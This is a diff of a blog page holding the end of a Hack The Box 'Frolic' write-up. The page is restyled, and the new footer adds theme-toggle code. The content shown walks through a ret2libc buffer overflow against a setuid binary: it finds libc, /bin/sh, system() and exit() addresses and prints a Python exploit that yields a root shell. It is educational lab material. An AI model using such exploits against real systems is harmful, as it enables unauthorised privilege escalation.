-<h4 id="address--0xb7e19000">Address : <code class="highlighter-rouge">0xb7e19000</code></h4>
-<h4 id="then-we-will-add-the-two-addresses-to-get-the-address-of-binsh">Then we will add the two addresses to get the address of <code class="highlighter-rouge">/bin/sh</code></h4>
-<h4 id="address-of-binsh--0x0015ba0b--0xb7e19000--0xb7f74a0b">Address of <code class="highlighter-rouge">/bin/sh</code> : <code class="highlighter-rouge">0x0015ba0b</code> + <code class="highlighter-rouge">0xb7e19000</code> = <code class="highlighter-rouge">0xb7f74a0b</code></h4>
-<h4 id="now-we-need-the-addresses-of-system-and-exit-">Now we need the addresses of <code class="highlighter-rouge">system()</code> and <code class="highlighter-rouge">exit()</code> :</h4>
-<p><img src="/images/hackthebox/frolic/41.png" alt="" /></p>
-<h4 id="address-of-system--0xb7e53da0">Address of <code class="highlighter-rouge">system()</code> : <code class="highlighter-rouge">0xb7e53da0</code></h4>
-<h4 id="address-of-exit--0xb7e479d0">Address of <code class="highlighter-rouge">exit()</code> : <code class="highlighter-rouge">0xb7e479d0</code></h4>
-<h4 id="our-final-exploit-will-be">Our final exploit will be:</h4>
+<img src="/images/hackthebox/frolic/38.png" alt="" />
+<br /> So the buffer overflows after 52 chars. Now we need to know the address of <code class="highlighter-rouge">/bin/sh</code> , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of <code class="highlighter-rouge">/bin/sh</code> in <code class="highlighter-rouge">libc</code> , we will use <code class="highlighter-rouge">strings</code> to get the address :
+<code class="highlighter-rouge">strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</code>
+<img src="/images/hackthebox/frolic/39.png" alt="" />
+<br /> Offset : <code class="highlighter-rouge">0x0015ba0b</code>
+<br /> Then we need the address of <code class="highlighter-rouge">libc</code> , we can use <code class="highlighter-rouge">ldd</code> to get it :
+<code class="highlighter-rouge">ldd rop</code>
+<img src="/images/hackthebox/frolic/40.png" alt="" />
+<br /> Address : <code class="highlighter-rouge">0xb7e19000</code>
+<br /> Then we will add the two addresses to get the address of <code class="highlighter-rouge">/bin/sh</code>
+<br /> Address of <code class="highlighter-rouge">/bin/sh</code> : <code class="highlighter-rouge">0x0015ba0b</code> + <code class="highlighter-rouge">0xb7e19000</code> = <code class="highlighter-rouge">0xb7f74a0b</code>
+<br /> Now we need the addresses of <code class="highlighter-rouge">system()</code> and <code class="highlighter-rouge">exit()</code> :
+<img src="/images/hackthebox/frolic/41.png" alt="" />
+<br /> Address of <code class="highlighter-rouge">system()</code> : <code class="highlighter-rouge">0xb7e53da0</code>
+<br /> Address of <code class="highlighter-rouge">exit()</code> : <code class="highlighter-rouge">0xb7e479d0</code>
+<br /> Our final exploit will be:</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
 
 <span class="kn">import</span> <span class="nn">struct</span>
@@ -310,54 +313,151 @@ return false;
 <span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span> <span class="p">,</span><span class="mh">0xb7f74a0b</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">buf</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">shell</span>
 </code></pre></div></div>
-<p><img src="/images/hackthebox/frolic/42.png" alt="" /></p>
-<h4 id="lets-upload-and-run-it-">Let’s upload and run it :</h4>
+<p><img src="/images/hackthebox/frolic/42.png" alt="" />
+<br /> Let’s upload and run it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./rop `python /tmp/exploit.py`
 </code></pre></div></div>
-<p><img src="/images/hackthebox/frolic/43.png" alt="" /></p>
-<h4 id="and-we-owned-root-">And we owned root !</h4>
-<p><br />
-<br /></p>
-<h4 id="thats-it--feedback-is-appreciated-">That’s it , Feedback is appreciated !</h4>
-<h4 id="dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-ahm3d_h3sham">Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a></h4>
-<h4 id="thanks-for-reading">Thanks for reading.</h4>
-<p><br />
-<br /></p>
-<h4 id="previous-hack-the-box-write-up--hack-the-box---carrier">Previous Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></h4>
-<h4 id="next-hack-the-box-write-up--hack-the-box---curling">Next Hack The Box write-up : <a href="/hack-the-box/curling/">Hack The Box - Curling</a></h4>
+<p><img src="/images/hackthebox/frolic/43.png" alt="" />
+<br /> And we owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/curling/">Hack The Box - Curling</a></p>
 <hr />
 
 
-  </div>
-<script src="https://www.hackthebox.eu/badge/65598"></script><a class="u-url" href="/hack-the-box/frolic/" hidden></a>
-</article>
-
-      </div>
-    </main><footer class="site-footer h-card">
-  <data class="u-url" href="/"></data>
-
-  <div class="wrapper">
-
-    <h2 class="footer-heading">0xRick Owned Root !</h2>
-
-    <div class="footer-col-wrapper">
-      <div class="footer-col footer-col-1">
-        <ul class="contact-list">
-          <li class="p-name">0xRick Owned Root !</li></ul>
-      </div>
-
-      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
 </div>
 
-      <div class="footer-col footer-col-3">
-        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
+
+
+
+
+<div class="related">
+  <h2>other posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/pwn/collision/">
+            pwnable.kr - collision
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/unattended/">
+            Hack The Box - Unattended
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box/helpline/">
+            Hack The Box - Helpline
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-3">binary-exploitation</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/exploit-development/" class="set-1">exploit development</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-5">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-3">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a></div>
+  
+
+
+
       </div>
-    </div>
+    </main><footer class="site-footer">
+	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
+  <div class="wrapper"><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
 
+if (theme === "dark") {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+} else if (theme === "light") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+} else if  (userPrefers === "dark") {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'dark');
+	document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	window.localStorage.setItem('theme', 'dark');
+	document.getElementById("theme-toggle").className = 'light';
+} else {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'light');
+	document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	window.localStorage.setItem('theme', 'light');
+	document.getElementById("theme-toggle").className = 'dark';
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    document.documentElement.setAttribute('data-theme', 'light');
+		document.documentElement.classList.add('theme--light');
+        document.documentElement.classList.remove('theme--dark');
+		window.localStorage.setItem('theme', 'light');
+	    document.getElementById("theme-toggle").className = 'dark';
+	} else {
+	    document.documentElement.setAttribute('data-theme', 'dark');
+		document.documentElement.classList.add('theme--dark');
+        document.documentElement.classList.remove('theme--light');
+		window.localStorage.setItem('theme', 'dark');
+	    document.getElementById("theme-toggle").className = 'light';
+	}
+}
+</script></div>
   </div>
-
 </footer>
-</body>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
 
 </html>
-
